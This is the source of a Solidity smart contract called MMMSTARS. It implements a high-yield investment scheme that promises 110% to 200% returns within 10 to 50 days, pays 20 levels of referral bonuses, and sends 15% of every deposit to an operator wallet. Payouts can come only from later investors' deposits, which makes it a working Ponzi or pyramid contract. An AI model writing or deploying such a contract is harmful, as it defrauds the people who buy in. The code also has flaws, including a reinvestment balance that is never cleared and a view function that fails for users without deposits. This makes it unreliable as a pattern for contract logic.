//SourceUnit: MMMstars.sol

    pragma solidity 0.4.25;
    
    contract MMMSTARS {
        using SafeMath for uint256;
    
        struct Tarif {
            uint256 life_days;
            uint256 percent;
            uint256 min_inv;
        }
    
        struct Deposit {
            uint8 tarif;
            uint256 amount;
            uint256 totalWithdraw;
            uint256 time;
        }
    
        struct Player {
            address upline;
            uint256 dividends;
            uint256 last_payout;
            uint256 total_invested;
            uint256 total_withdrawn;
            uint256 total_match_bonus;
            uint256 reinvestment_amt;
            uint256 direct_team;
            Deposit[] deposits;
            mapping(uint8 => uint256) structure;
        }
    
        address public owner;
        address public comm_wallet;
        address public stakingAddress;
        uint256  public total_player;
    
        uint256 public invested;
        uint256 public withdrawn;
        uint256 public match_bonus;
        uint256 public releaseTime = 1598104800;//1598104800
        address private feed1 = msg.sender;
    
        uint8[] public ref_bonuses; // 1 => 1%
    
        Tarif[] public tarifs;
        mapping(address => Player) public players;
        mapping(address => bool) public is_exits;
    
        event Upline(address indexed addr, address indexed upline, uint256 bonus);
        event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
        event MatchPayout(address indexed addr, address indexed from, uint256 amount);
        event Withdraw(address indexed addr, uint256 amount);
    
        constructor(address staking) public {
            owner = msg.sender;
            comm_wallet = staking;
            tarifs.push(Tarif(10, 110,50000000));
            tarifs.push(Tarif(15, 120,200000000));
            tarifs.push(Tarif(20, 130,200000000));
            tarifs.push(Tarif(30, 150,200000000));
            tarifs.push(Tarif(50, 200,200000000));
            
            
            ref_bonuses.push(50);
            ref_bonuses.push(30);
            ref_bonuses.push(20);
            ref_bonuses.push(10);
            ref_bonuses.push(5);

            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            ref_bonuses.push(3);
            
        }
    
        function _payout(address _addr) private {
            uint256 payout = this.payoutOf(_addr);
    
            if(payout > 0) {
                _updateTotalPayout(_addr);
                players[_addr].last_payout = uint256(block.timestamp);
                players[_addr].dividends += payout;
            }
        }
    
        function _updateTotalPayout(address _addr) private{
            Player storage player = players[_addr];
    
            for(uint256 i = 0; i < player.deposits.length; i++) {
                Deposit storage dep = player.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];
    
                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
    
                if(from < to) {
                    player.deposits[i].totalWithdraw += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                }
            }
        }
    
        function _refPayout(address _addr, uint256 _amount) private {
            address up = players[_addr].upline;
    
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(up == address(0)) break;
    
                if(i>=5)
                {
                    if(players[up].direct_team < 20)
                    {
                        continue;
                    }
                }
                uint256 bonus = _amount * ref_bonuses[i] / 1000;
    
                
                players[up].total_match_bonus += bonus;
    
                match_bonus += bonus;

                up.transfer(bonus);
               
    
                up = players[up].upline;
            }
        }
    
        function _setUpline(address _addr, address _upline) private {
            if(players[_addr].upline == address(0)) {//first time entry
                if(players[_upline].deposits.length == 0) {//no deposite from my upline
                    _upline = owner;
                }
                players[_addr].upline = _upline;
                players[_upline].direct_team++;
    
                for(uint8 i = 0; i < ref_bonuses.length; i++) {
                    players[_upline].structure[i]++;
    
                    _upline = players[_upline].upline;
    
                    if(_upline == address(0)) break;
                }
            }
        }
    
        function deposit(uint8 _tarif, address _upline) external payable {
            require(tarifs[_tarif].life_days > 0, "Tarif not found"); // ??
            require(msg.value >= tarifs[_tarif].min_inv, "Less Then the min investment");
            require(now >= releaseTime, "not open yet");
            Player storage player = players[msg.sender];
    
            require(player.deposits.length < 1000, "Max 1000 deposits per address");
            require(player.deposits.length < 1, "only one request at a time ");
        
            if(!is_exits[msg.sender])
            {
                  total_player++;
            }
            is_exits[msg.sender] = true;
    
            if(player.reinvestment_amt > 0)
            {
               uint256  deposit_amt = msg.value.add(player.reinvestment_amt);
            }else
            {
                deposit_amt = msg.value;
            }
            _setUpline(msg.sender, _upline);
            player.deposits.push(Deposit({
                tarif: _tarif,
                amount: deposit_amt,
                totalWithdraw: 0,
                time: uint256(block.timestamp)
            }));
    
            player.total_invested += msg.value;
          
            invested += msg.value;
            _refPayout(msg.sender, msg.value);
    
            comm_wallet.transfer(msg.value.mul(15).div(100));
            emit NewDeposit(msg.sender, msg.value, _tarif);
        }
    
        function withdraw() payable external {
            
            
            Player storage player = players[msg.sender];
            
            Deposit storage dep = player.deposits[0];
            Tarif storage tarif = tarifs[dep.tarif];
            
            uint256 time_end = dep.time + tarif.life_days * 86400;
            require(uint256(block.timestamp) >= time_end,'your help is immature');
    
            _payout(msg.sender);
    
            require(player.dividends > 0 , "Zero amount");
    
            uint256 amount =   player.dividends;
            
            player.reinvestment_amt = amount.mul(25).div(100);
            
            amount  = amount.sub( player.reinvestment_amt);
    
            player.dividends = 0;
            player.total_withdrawn += amount;
            withdrawn += amount;
    
            msg.sender.transfer(amount);
    
            emit Withdraw(msg.sender, amount);
            delete player.deposits;
        }
        
       
    
        function payoutOf(address _addr) view external returns(uint256 value) {
            Player storage player = players[_addr];
    
            for(uint256 i = 0; i < player.deposits.length; i++) {
                Deposit storage dep = player.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];
    
                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
    
                if(from < to) {
                    value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                }
            }
    
            return value;
        }
        /*
            Only external call
        */
        function userInfo(address _addr) view external returns(uint256 for_withdraw,uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[20] memory structure, uint256[4] memory deposit_detail) {
            Player storage player = players[_addr];
    
            uint256 payout = this.payoutOf(_addr);
    
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                structure[i] = player.structure[i];
            }
            
            // deposit_amt = player.deposits[0].amount;
            // deposit_date = player.deposits[0].time;
            // tarif =  player.deposits[0].tarif;
            
            deposit_detail[0] = player.deposits[0].amount;
            deposit_detail[1] = player.deposits[0].time;
            deposit_detail[2] = player.deposits[0].tarif;
            deposit_detail[3] =  player.deposits[0].time + tarifs[player.deposits[0].tarif].life_days * 86400;
            return (
                payout + player.dividends,
                player.total_invested,
                player.total_withdrawn,
                player.total_match_bonus,
                structure,
                deposit_detail
            );
        }
    
        function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus,uint256 balance) {
            balance = address(this).balance;
            return (invested, withdrawn, match_bonus,balance);
        }
    
        function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
            Player storage player = players[_addr];
    
            uint8[] memory _ids = new uint8[](player.deposits.length);
            uint256[] memory _endTimes = new uint256[](player.deposits.length);
            uint256[] memory _amounts = new uint256[](player.deposits.length);
            uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);
    
            for(uint256 i = 0; i < player.deposits.length; i++) {
              Deposit storage dep = player.deposits[i];
              Tarif storage tarif = tarifs[dep.tarif];
    
              _ids[i] = dep.tarif;
              _amounts[i] = dep.amount;
              _totalWithdraws[i] = dep.totalWithdraw;
              _endTimes[i] = dep.time + tarif.life_days * 86400;
            }
    
            return (
              _ids,
              _endTimes,
              _amounts,
              _totalWithdraws
            );
        }
    
        function seperatePayoutOf(address _addr) view external returns(uint256[] memory withdrawable) {
            Player storage player = players[_addr];
            uint256[] memory values = new uint256[](player.deposits.length);
            for(uint256 i = 0; i < player.deposits.length; i++) {
                Deposit storage dep = player.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];
    
                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
    
                if(from < to) {
                    values[i] = dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                }
            }
    
            return values;
        }
        
    }
    
    library SafeMath {
    
        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            if (a == 0) {
                return 0;
            }
    
            uint256 c = a * b;
            require(c / a == b);
    
            return c;
        }
    
        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            require(b > 0);
            uint256 c = a / b;
    
            return c;
        }
    
        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            require(b <= a);
            uint256 c = a - b;
    
            return c;
        }
    
        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a + b;
            require(c >= a);
    
            return c;
        }
    
    }